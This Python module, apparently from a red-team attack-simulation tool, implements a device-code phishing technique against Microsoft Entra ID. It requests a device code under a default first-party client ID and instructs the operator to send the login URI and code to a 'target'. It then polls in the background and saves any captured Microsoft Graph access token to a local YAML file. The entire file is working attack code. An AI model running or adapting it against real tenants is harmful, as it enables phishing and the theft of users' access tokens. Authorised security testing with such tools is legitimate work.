import yaml
import requests
import time
from multiprocessing import Process

def TechniqueMain(tenant_id, client_id = None):

    # input validation
    if tenant_id in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if client_id in [None, ""]:
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #set default client id

    endpoint_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"
    scope = "https://graph.microsoft.com/.default"

    data = {
        "client_id": client_id,
        "scope": scope,
    }

    generate_device_code_flow = requests.post(url=endpoint_url, data=data).json()

    user_code = generate_device_code_flow['user_code']
    verification_uri = generate_device_code_flow['verification_uri']
    device_code = generate_device_code_flow['device_code']
    polling_interval = generate_device_code_flow['interval']

    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    token_data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": client_id,
        "device_code": device_code,
    }

    # creating background process to check for device code flow auth
    raw_response = Process(target = AcquireDeviceCodeFlowToken, args=(token_url, token_data, polling_interval))
    # starting process in background
    raw_response.start()

    # return details to authenticate via device code flow
    try:
        # parse raw response => pretty response
        try:
            # create pretty response
            pretty_response = {}

            pretty_response["Success"] = {
                "Instruction" : "Send the below login URI and code to the target to capture access token",
                "URI" : verification_uri,
                "User Code" : user_code,
                "Note" : "Continue with other actions after saving URI & code. When the target successfully authenticates the token will be available on Access page"
            }
            return True, raw_response, pretty_response
        except:
            # return only raw response if pretty response fails
            return True, raw_response, None
    except Exception as e:
        return False, {"Error" : e}, None

def AcquireDeviceCodeFlowToken(token_url, token_data, polling_interval):

    # poll till access token is received
    while True:
        time.sleep(polling_interval)
        token_response = requests.post(token_url, data=token_data)

        if token_response.status_code == 200:
            token_json = token_response.json()
            access_token = token_json['access_token']
            # save access token
            SaveTokens(access_token)
            break
        elif token_response.status_code == 400 and 'error' in token_response.json() and token_response.json()['error'] == 'authorization_pending':
            # continue polling
            print("EntraID-016 : Continuing to poll...")
        else:
            break

def SaveTokens(new_token):

    # add new access tokens to tokens yaml file
    tokens_file = "./local/MSFT_Graph_Tokens.yml"

    # if read fails because file does not exist - create file and initialize tokens array
    try:
        with open(tokens_file, "r") as tokens_data:
            all_tokens_data = yaml.safe_load(tokens_data)
    except:
        with open(tokens_file, "w") as file:
            all_tokens_data = {'AllTokens':[]}

    if new_token not in all_tokens_data['AllTokens']:
        all_tokens_data['AllTokens'].append(new_token)

        with open(tokens_file, 'w') as file:
            yaml.dump(all_tokens_data, file)

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Tenant ID", "id" : "device-code-flow-tenant-id-text-input", "type" : "text", "placeholder" : "1234-5678-9098-7654-3210", "element_type" : "dcc.Input"},
        {"title" : "Client ID (Optional)", "id" : "device-code-flow-client-id-text-input", "type" : "text", "placeholder" : "(Optonal)1234-5678-9098-7654-3210", "element_type" : "dcc.Input"}
    ]